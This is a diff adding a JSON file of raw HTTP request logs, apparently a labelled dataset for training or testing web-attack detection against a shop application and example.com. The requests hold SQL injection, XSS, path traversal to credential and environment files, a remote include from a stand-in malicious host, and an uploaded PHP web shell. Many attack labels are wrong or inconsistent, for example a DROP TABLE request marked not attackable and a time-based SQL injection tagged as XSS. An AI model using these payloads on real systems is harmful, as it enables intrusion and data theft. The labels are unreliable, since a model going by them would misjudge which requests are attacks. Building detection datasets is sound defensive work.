@@ -1,0 +1,122 @@
+[
+  {
+    "original_log": "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam\u00f3n+Ib\u00e9rico&precio=85&cantidad='; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&B1=A\u00f1adir+al+carrito HTTP/1.1",
+    "is_attackable": false,
+    "attack_type": ""
+  },
+  {
+    "original_log": "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Jam\u00f3n+Ib\u00e9rico&precio=85&cantidad='; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&B1=A\u00f1adir+al+carrito",
+    "is_attackable": true,
+    "attack_type": "sqli"
+  },
+  {
+    "original_log": "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob@<SCRIPT>alert(Paros)</SCRIPT>.parosproxy.org&pwd=84m3ri156&remember=on&B1=Entrar HTTP/1.1",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=bob@<SCRIPT>alert(Paros)</SCRIPT>.parosproxy.org&pwd=84m3ri156&remember=on&B1=Entrar",
+    "is_attackable": true,
+    "attack_type": "XSS"
+  },
+  {
+    "original_log": "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=grimshaw&pwd=G//lAc,IAr&remember=on&B1=Entrar HTTP/1.1",
+    "is_attackable": null,
+    "attack_type": "error"
+  },
+  {
+    "original_log": "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=grimshaw&pwd=G//lAc,IAr&remember=on&B1=Entrar",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nPragma: no-cache\nCache-control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Encoding: x-gzip, x-deflate, gzip, deflate\nAccept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\nAccept-Language: en\nHost: localhost:8080\nCookie: JSESSIONID=E59D8FE73AD6F70DC813150199CD4D0B\nConnection: close",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nPragma: no-cache\nCache-control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Encoding: x-gzip, x-deflate, gzip, deflate\nAccept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\nAccept-Language: en\nHost: localhost:8080\nCookie: JSESSIONID=D4E5A25E75262061F7D6548947B226E4\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 106\n\nmodo=insertar&precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja",
+    "is_attackable": true,
+    "attack_type": "xss"
+  },
+  {
+    "original_log": "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=183&B1=Pasar+por+caja%2F HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nPragma: no-cache\nCache-control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Encoding: x-gzip, x-deflate, gzip, deflate\nAccept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\nAccept-Language: en\nHost: localhost:8080\nCookie: JSESSIONID=6BB13A944A2914598A2BB5469B2178D6\nConnection: close",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nPragma: no-cache\nCache-control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Encoding: x-gzip, x-deflate, gzip, deflate\nAccept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\nAccept-Language: en\nHost: localhost:8080\nCookie: JSESSIONID=D7C0E36A0CAB0FBFC20D37D91E9CCF18\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 45\n\nmodo=insertar&precio=183&B1=Pasar+por+caja%2F",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=183&B1A=Pasar+por+caja HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nPragma: no-cache\nCache-control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Encoding: x-gzip, x-deflate, gzip, deflate\nAccept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\nAccept-Language: en\nHost: localhost:8080\nCookie: JSESSIONID=837899BE3426897D2D17349939BA293C\nConnection: close",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nPragma: no-cache\nCache-control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Encoding: x-gzip, x-deflate, gzip, deflate\nAccept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\nAccept-Language: en\nHost: localhost:8080\nCookie: JSESSIONID=BD3A6F51A99359184D480C929D97D6BF\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 43\n\nmodo=insertar&precio=183&B1A=Pasar+por+caja",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://example.com/search?q=<script>alert(1)</script> HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "POST http://example.com/login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nusername=admin'--&password=password",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://example.com/../../etc/passwd HTTP/1.1\nHost: example.com\nUser-Agent: curl/7.64.1",
+    "is_attackable": false,
+    "attack_type": "lfi"
+  },
+  {
+    "original_log": "GET http://example.com/file.php?file=http://malicious.com/evil.php HTTP/1.1\nHost: example.com\nUser-Agent: curl/7.64.1",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://example.com/file.php?file=../../../../proc/self/environ HTTP/1.1\nHost: example.com\nUser-Agent: curl/7.64.1",
+    "is_attackable": true,
+    "attack_type": "lfi"
+  },
+  {
+    "original_log": "GET http://example.com/page.php?id=1' OR '1'='1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "is_attackable": true,
+    "attack_type": "sqli"
+  },
+  {
+    "original_log": "POST http://example.com/upload HTTP/1.1\nHost: example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Length: 200\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
+    "is_attackable": true,
+    "attack_type": "lfi"
+  },
+  {
+    "original_log": "GET http://example.com/search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://example.com/page.php?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "is_attackable": true,
+    "attack_type": "sqli"
+  },
+  {
+    "original_log": "GET http://example.com/page.php?id=1; DROP TABLE users; HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "is_attackable": false,
+    "attack_type": "none"
+  },
+  {
+    "original_log": "GET http://example.com/page.php?id=1' OR '1'='1'-- HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "is_attackable": true,
+    "attack_type": "sqli"
+  },
+  {
+    "original_log": "GET http://example.com/page.php?id=1%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "is_attackable": true,
+    "attack_type": "sqli"
+  }
+]
